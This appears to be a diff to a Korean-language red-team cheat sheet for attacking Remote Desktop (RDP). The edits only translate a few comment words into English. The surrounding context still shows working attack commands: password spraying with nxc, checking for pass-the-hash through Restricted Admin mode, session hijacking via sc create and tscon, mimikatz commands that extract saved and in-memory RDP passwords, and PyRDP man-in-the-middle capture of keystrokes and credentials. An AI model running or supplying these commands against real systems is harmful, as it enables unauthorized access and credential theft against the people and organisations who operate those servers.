@@ -50,7 +50,7 @@ nxc rdp TARGET -u users.txt -p 'Password1!' --continue-on-success
 ### Restricted Admin Mode
 
 ```bash
-# Restricted Admin 활성화 여부 확인 (레지스트리)
+# Restricted Admin 활성화 여부 확인 (Registry)
 # HKLM\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin = 0
 
 # Pass-the-Hash로 RDP 접속
@@ -74,7 +74,7 @@ sc create rdphijack binpath="cmd.exe /k tscon SESSION_ID /dest:rdp-tcp#0" start=
 net start rdphijack
 ```
 
-### RDP 키로깅/캡처
+### RDP 키로깅/capture
 
 ```bash
 # SharpRDP - RDP를 통한 원격 명령 실행 (GUI 없이)
@@ -132,7 +132,7 @@ dpapi::cred /in:%APPDATA%\Microsoft\Credentials\<GUID>
 dpapi::cred /in:... /masterkey:<MASTERKEY>
 
 # 실행 중인 mstsc 에서 평문 추출
-ts::mstsc                 # 현재 session의 mstsc 프로세스에서 패스워드 긁기
+ts::mstsc                 # 현재 session의 mstsc 프로세스에서 password 긁기
 ```
 
 ---
@@ -142,7 +142,7 @@ ts::mstsc                 # 현재 session의 mstsc 프로세스에서 패스워
 조건: 공격자가 target과 RDP 서버 사이 경로(ARP spoofing, DNS hijack, 사내 man-in-the-middle 등)를 가질 때.
 
 ```bash
-# PyRDP - 투명 MITM 프록시 (키 입력 / 클립보드 / 파일 / 크리덴셜 캡처)
+# PyRDP - 투명 MITM proxy (키 입력 / 클립보드 / 파일 / 크리덴셜 capture)
 pyrdp-mitm.py RDP_SERVER_IP
 pyrdp-mitm.py RDP_SERVER_IP -o /tmp/pyrdp --no-replay
 
